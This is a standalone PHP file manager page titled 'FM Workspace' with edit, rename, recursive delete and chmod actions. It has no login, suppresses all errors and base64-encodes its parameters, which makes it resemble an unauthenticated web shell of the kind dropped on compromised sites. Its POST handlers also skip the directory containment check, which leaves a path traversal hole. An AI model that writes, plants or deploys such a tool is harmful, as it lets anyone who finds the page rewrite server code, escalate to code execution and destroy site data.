<?php
error_reporting(0);
ini_set('display_errors', '0');
session_start();

function enc($s) { return str_replace(['+','/','='], ['-','_',''], base64_encode((string)$s)); }
function dec($s) {
    $s = (string)$s;
    $p = 4 - strlen($s) % 4;
    $s .= str_repeat('=', $p === 4 ? 0 : $p);
    $d = @base64_decode(str_replace(['-','_'], ['+','/'], $s), true);
    return $d !== false ? $d : '';
}

$base_dir = realpath(__DIR__);
if ($base_dir === false) $base_dir = __DIR__;

$dir_param = '';
if (isset($_GET['p'])) $dir_param = dec($_GET['p']);

$current_dir = realpath($base_dir . '/' . $dir_param);
$is_valid_dir = true;
if ($current_dir === false) $is_valid_dir = false;
else if (strpos((string)$current_dir, $base_dir) !== 0) $is_valid_dir = false;

if ($is_valid_dir === false) $current_dir = $base_dir;

$relative_dir = '/';
$len_current = strlen((string)$current_dir);
$len_base = strlen($base_dir);
if ($len_current > $len_base) $relative_dir = substr((string)$current_dir, $len_base);
$relative_dir = ltrim(str_replace('\\', '/', (string)$relative_dir), '/');
$p_enc = enc($relative_dir);

$task = '';
if (isset($_GET['t'])) $task = (string)$_GET['t'];

$item_param = '';
if (isset($_GET['i'])) $item_param = dec($_GET['i']);

$target_item = false;
if ($item_param !== '') {
    $target_item = realpath($current_dir . '/' . $item_param);
}
if ($target_item !== false) {
    if (strpos((string)$target_item, $base_dir) !== 0) $target_item = false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $post_task = '';
    if (isset($_POST['t'])) $post_task = (string)$_POST['t'];
    
    $post_item = '';
    if (isset($_POST['i'])) $post_item = dec($_POST['i']);
    
    $tgt = '';
    if ($post_item !== '') $tgt = $current_dir . '/' . $post_item;
    
    if ($post_task === 'e') {
        if (isset($_POST['c']) && $tgt !== '') {
            $content = dec($_POST['c']);
            if (file_exists($tgt) && is_file($tgt) && is_writable($tgt)) {
                @file_put_contents($tgt, $content);
            }
        }
        header("Location: ?p=" . $p_enc);
        exit;
    }
    
    if ($post_task === 'r') {
        if (isset($_POST['n']) && $tgt !== '') {
            $new_name = dec($_POST['n']);
            $new_path = $current_dir . '/' . $new_name;
            if (file_exists($tgt) && !file_exists($new_path) && is_writable($current_dir)) {
                @rename($tgt, $new_path);
            }
        }
        header("Location: ?p=" . $p_enc);
        exit;
    }
    
    if ($post_task === 'd') {
        if ($tgt !== '' && file_exists($tgt)) {
            if (is_dir($tgt)) {
                function rmdir_r($dir) {
                    if (!is_dir($dir)) return;
                    $items = @scandir($dir);
                    if (is_array($items)) {
                        foreach($items as $f) {
                            if ($f === '.' || $f === '..') continue;
                            $path = $dir . '/' . $f;
                            if (is_dir($path)) rmdir_r($path);
                            else @unlink($path);
                        }
                    }
                    @rmdir($dir);
                }
                rmdir_r($tgt);
            }
            else @unlink($tgt);
        }
        header("Location: ?p=" . $p_enc);
        exit;
    }
    
    if ($post_task === 'c') {
        if (isset($_POST['m']) && $tgt !== '') {
            $mode_str = (string)$_POST['m'];
            if (file_exists($tgt)) @chmod($tgt, octdec($mode_str));
        }
        header("Location: ?p=" . $p_enc);
        exit;
    }
}

function get_perms($file) {
    $perms = @fileperms($file);
    if ($perms === false) return '---';
    if (($perms & 0xC000) == 0xC000) $i = 's';
    elseif (($perms & 0xA000) == 0xA000) $i = 'l';
    elseif (($perms & 0x8000) == 0x8000) $i = '-';
    elseif (($perms & 0x6000) == 0x6000) $i = 'b';
    elseif (($perms & 0x4000) == 0x4000) $i = 'd';
    elseif (($perms & 0x2000) == 0x2000) $i = 'c';
    elseif (($perms & 0x1000) == 0x1000) $i = 'p';
    else $i = 'u';
    $i .= (($perms & 0x0100) ? 'r' : '-');
    $i .= (($perms & 0x0080) ? 'w' : '-');
    $i .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $i .= (($perms & 0x0020) ? 'r' : '-');
    $i .= (($perms & 0x0010) ? 'w' : '-');
    $i .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $i .= (($perms & 0x0004) ? 'r' : '-');
    $i .= (($perms & 0x0002) ? 'w' : '-');
    $i .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $i;
}

function format_size($bytes) {
    if (!is_numeric($bytes) || $bytes < 0) return '-';
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

$dirs = []; $files = [];
$items = @scandir($current_dir);
if (is_array($items)) {
    foreach ($items as $item) {
        if ($item === '.') continue;
        if ($item === '..' && $current_dir === $base_dir) continue;
        $path = $current_dir . '/' . $item;
        if (@is_dir($path)) $dirs[] = $item;
        else $files[] = $item;
    }
}
natcasesort($dirs); natcasesort($files);
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>FM Workspace</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #09090b; 
    --panel: #18181b;
    --border: #27272a;
    --hover: #27272a;
    --text: #f4f4f5;
    --muted: #a1a1aa;
    --accent: #ededed;
    --danger: #ef4444;
    --font-ui: "Inter", -apple-system, sans-serif;
    --font-mono: "JetBrains Mono", monospace;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background-color: var(--bg);
    color: var(--text);
    font-family: var(--font-ui);
    font-size: 14px;
    line-height: 1.5;
    -webkit-font-smoothing: antialiased;
    padding: 1.5rem 1rem;
  }
  .container { max-width: 900px; margin: 0 auto; }
  
  /* Header / Breadcrumb */
  .header { display: flex; align-items: center; gap: 8px; margin-bottom: 1.5rem; background: var(--panel); padding: 12px 16px; border-radius: 8px; border: 1px solid var(--border); overflow-x: auto; white-space: nowrap; }
  .header a { color: var(--muted); text-decoration: none; font-family: var(--font-mono); font-size: 13px; transition: color 0.2s; }
  .header a:hover { color: var(--text); }
  .header .sep { color: var(--border); }
  
  /* Form Panels */
  .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 20px; margin-bottom: 1.5rem; }
  .panel h2 { font-size: 16px; font-weight: 500; margin-bottom: 16px; color: var(--text); display: flex; align-items: center; gap: 8px; }
  .form-group { margin-bottom: 16px; }
  input[type="text"], textarea { width: 100%; background: var(--bg); border: 1px solid var(--border); color: var(--text); padding: 10px 14px; font-family: var(--font-mono); font-size: 13px; border-radius: 6px; outline: none; transition: border-color 0.2s; }
  textarea { height: 60vh; min-height: 300px; resize: vertical; line-height: 1.6; }
  input:focus, textarea:focus { border-color: #52525b; }
  .actions-row { display: flex; gap: 12px; align-items: center; }
  .btn-submit { background: var(--accent); color: #000; border: none; padding: 10px 18px; font-weight: 500; font-size: 13px; border-radius: 6px; cursor: pointer; transition: opacity 0.2s; }
  .btn-submit:hover { opacity: 0.9; }
  .btn-cancel { color: var(--muted); text-decoration: none; font-size: 13px; transition: color 0.2s; }
  .btn-cancel:hover { color: var(--text); }

  /* List Grid */
  .list { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
  .list-head { display: flex; padding: 12px 16px; background: var(--bg); border-bottom: 1px solid var(--border); font-size: 12px; text-transform: uppercase; color: var(--muted); font-weight: 600; letter-spacing: 0.05em; }
  .list-item { display: flex; align-items: center; padding: 12px 16px; border-bottom: 1px solid var(--border); gap: 16px; transition: background 0.2s; }
  .list-item:last-child { border-bottom: none; }
  .list-item:hover { background: var(--hover); }
  
  .item-icon { color: var(--muted); display: flex; align-items: center; justify-content: center; width: 24px; }
  .item-main { flex: 1; min-width: 0; display: flex; flex-direction: column; gap: 4px; }
  .item-name { color: var(--text); font-family: var(--font-mono); text-decoration: none; font-size: 14px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  .item-name:hover { text-decoration: underline; }
  
  .item-col { flex-shrink: 0; font-family: var(--font-mono); font-size: 13px; color: var(--muted); }
  .col-size { width: 80px; }
  .col-perms { width: 100px; }
  .item-meta { display: none; }
  
  .col-actions { display: flex; gap: 4px; flex-shrink: 0; }
  .btn-icon { background: transparent; border: none; color: var(--muted); cursor: pointer; padding: 6px; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; text-decoration: none; transition: all 0.2s; }
  .btn-icon:hover { background: var(--border); color: var(--text); }
  .btn-icon.text-danger:hover { background: #ef444420; color: var(--danger); }
  .btn-icon svg { width: 16px; height: 16px; }

  /* Mobile Responsive */
  @media (max-width: 768px) {
    body { padding: 1rem 0.5rem; }
    .list-head { display: none; }
    .item-col { display: none; }
    .item-meta { display: flex; gap: 12px; font-size: 12px; color: var(--muted); font-family: var(--font-mono); }
    .list-item { gap: 12px; padding: 14px 12px; }
  }
</style>
<script>
function b(str) {
    var e = new TextEncoder().encode(str);
    var s = '';
    for (var i = 0; i < e.length; i++) s += String.fromCharCode(e[i]);
    return btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
function sE(e, form) { e.preventDefault(); form.querySelector('#c_enc').value = b(form.querySelector('#c_raw').value); form.submit(); }
function sR(e, form) { e.preventDefault(); form.querySelector('#n_enc').value = b(form.querySelector('#n_raw').value); form.submit(); }
</script>
</head>
<body>
<div class="container">
  <div class="header">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--muted);"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
    <?php
    $parts = explode('/', trim((string)$relative_dir, '/'));
    echo '<a href="?p=">~</a>';
    $accum = '';
    foreach($parts as $p) {
      if ($p === '') continue;
      $accum .= '/' . $p;
      echo '<span class="sep">/</span>';
      echo '<a href="?p='.enc(ltrim($accum, '/')).'">'.htmlspecialchars((string)$p).'</a>';
    }
    ?>
  </div>

  <?php if ($task !== '' && $target_item !== false && file_exists($target_item)): ?>
    <?php if ($task === 'e' && is_file($target_item)): ?>
      <div class="panel">
        <h2><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg> Edit File</h2>
        <form method="POST" action="?p=<?= $p_enc ?>" onsubmit="sE(event, this)">
          <input type="hidden" name="t" value="e">
          <input type="hidden" name="i" value="<?= enc($item_param) ?>">
          <input type="hidden" name="c" id="c_enc">
          <div class="form-group">
            <textarea id="c_raw" spellcheck="false"><?= htmlspecialchars((string)@file_get_contents($target_item)) ?></textarea>
          </div>
          <div class="actions-row">
            <button type="submit" class="btn-submit">Save changes</button>
            <a href="?p=<?= $p_enc ?>" class="btn-cancel">Cancel</a>
          </div>
        </form>
      </div>
    <?php elseif ($task === 'r'): ?>
      <div class="panel">
        <h2><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 7 4 4 20 4 20 7"></polyline><line x1="9" y1="20" x2="15" y2="20"></line><line x1="12" y1="4" x2="12" y2="20"></line></svg> Rename</h2>
        <form method="POST" action="?p=<?= $p_enc ?>" onsubmit="sR(event, this)">
          <input type="hidden" name="t" value="r">
          <input type="hidden" name="i" value="<?= enc($item_param) ?>">
          <input type="hidden" name="n" id="n_enc">
          <div class="form-group">
            <input type="text" id="n_raw" value="<?= htmlspecialchars((string)$item_param) ?>" autofocus>
          </div>
          <div class="actions-row">
            <button type="submit" class="btn-submit">Rename item</button>
            <a href="?p=<?= $p_enc ?>" class="btn-cancel">Cancel</a>
          </div>
        </form>
      </div>
    <?php elseif ($task === 'c'): ?>
      <div class="panel">
        <h2><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg> Change Permissions</h2>
        <form method="POST" action="?p=<?= $p_enc ?>">
          <input type="hidden" name="t" value="c">
          <input type="hidden" name="i" value="<?= enc($item_param) ?>">
          <div class="form-group">
            <?php $fp = @fileperms($target_item); $m = $fp !== false ? substr(sprintf('%o', $fp), -4) : '0644'; ?>
            <input type="text" name="m" value="<?= htmlspecialchars($m) ?>" autofocus>
          </div>
          <div class="actions-row">
            <button type="submit" class="btn-submit">Apply chmod</button>
            <a href="?p=<?= $p_enc ?>" class="btn-cancel">Cancel</a>
          </div>
        </form>
      </div>
    <?php endif; ?>
  <?php endif; ?>

  <div class="list">
    <div class="list-head">
      <div style="flex:1">Name</div>
      <div class="item-col col-size">Size</div>
      <div class="item-col col-perms">Perms</div>
      <div style="width:120px;text-align:right;">Actions</div>
    </div>
    
    <?php foreach ($dirs as $d): $dpath = $current_dir . '/' . $d; ?>
    <div class="list-item">
      <div class="item-icon">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
      </div>
      <div class="item-main">
        <a href="?p=<?= enc(ltrim($relative_dir . '/' . $d, '/')) ?>" class="item-name"><?= htmlspecialchars((string)$d) ?></a>
        <div class="item-meta">
          <span>DIR</span>
          <span><?= get_perms($dpath) ?></span>
        </div>
      </div>
      <div class="item-col col-size">-</div>
      <div class="item-col col-perms"><?= get_perms($dpath) ?></div>
      <div class="col-actions">
        <?php if($d !== '..'): ?>
        <a href="?p=<?= $p_enc ?>&t=r&i=<?= enc($d) ?>" class="btn-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 7 4 4 20 4 20 7"></polyline><line x1="9" y1="20" x2="15" y2="20"></line><line x1="12" y1="4" x2="12" y2="20"></line></svg></a>
        <a href="?p=<?= $p_enc ?>&t=c&i=<?= enc($d) ?>" class="btn-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></a>
        <form method="POST" action="?p=<?= $p_enc ?>" style="margin:0;padding:0;display:flex;">
          <input type="hidden" name="t" value="d">
          <input type="hidden" name="i" value="<?= enc($d) ?>">
          <button type="submit" class="btn-icon text-danger" onclick="return confirm('Delete directory?');"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg></button>
        </form>
        <?php endif; ?>
      </div>
    </div>
    <?php endforeach; ?>
    
    <?php foreach ($files as $f): $fpath = $current_dir . '/' . $f; $fsize = @filesize($fpath); ?>
    <div class="list-item">
      <div class="item-icon" style="color:#52525b;">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline></svg>
      </div>
      <div class="item-main">
        <span class="item-name"><?= htmlspecialchars((string)$f) ?></span>
        <div class="item-meta">
          <span><?= format_size($fsize) ?></span>
          <span><?= get_perms($fpath) ?></span>
        </div>
      </div>
      <div class="item-col col-size"><?= format_size($fsize) ?></div>
      <div class="item-col col-perms"><?= get_perms($fpath) ?></div>
      <div class="col-actions">
        <a href="?p=<?= $p_enc ?>&t=e&i=<?= enc($f) ?>" class="btn-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg></a>
        <a href="?p=<?= $p_enc ?>&t=r&i=<?= enc($f) ?>" class="btn-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 7 4 4 20 4 20 7"></polyline><line x1="9" y1="20" x2="15" y2="20"></line><line x1="12" y1="4" x2="12" y2="20"></line></svg></a>
        <a href="?p=<?= $p_enc ?>&t=c&i=<?= enc($f) ?>" class="btn-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg></a>
        <form method="POST" action="?p=<?= $p_enc ?>" style="margin:0;padding:0;display:flex;">
          <input type="hidden" name="t" value="d">
          <input type="hidden" name="i" value="<?= enc($f) ?>">
          <button type="submit" class="btn-icon text-danger" onclick="return confirm('Delete file?');"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg></button>
        </form>
      </div>
    </div>
    <?php endforeach; ?>
  </div>
</div>
</body>
</html>
